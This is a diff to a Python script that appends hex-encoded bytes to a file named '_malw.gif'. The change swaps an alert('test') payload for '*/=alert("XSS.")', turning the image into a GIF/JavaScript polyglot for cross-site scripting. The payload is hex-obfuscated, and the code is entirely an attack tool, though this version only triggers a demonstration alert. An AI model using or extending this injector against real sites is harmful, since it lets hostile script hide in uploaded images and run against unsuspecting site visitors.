@@ -15,7 +15,7 @@ def inject_into_file(fname):
         
     f = open(fname + "_malw.gif", "a+b") #appending mode
     f.write(b'\x2A\x2F\x3D\x31\x3B')
-    f.write(b'\x5C\x22\x61\x6C\x65\x72\x74\x28\x5C\x22\x74\x65\x73\x74\x5C\x22\x29')
+    f.write(b'\x2A\x2F\x3D\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x2E\x22\x29')
     f.write(b'\x3B')
     f.close()
     print("Procedure complete, check gif.\n")
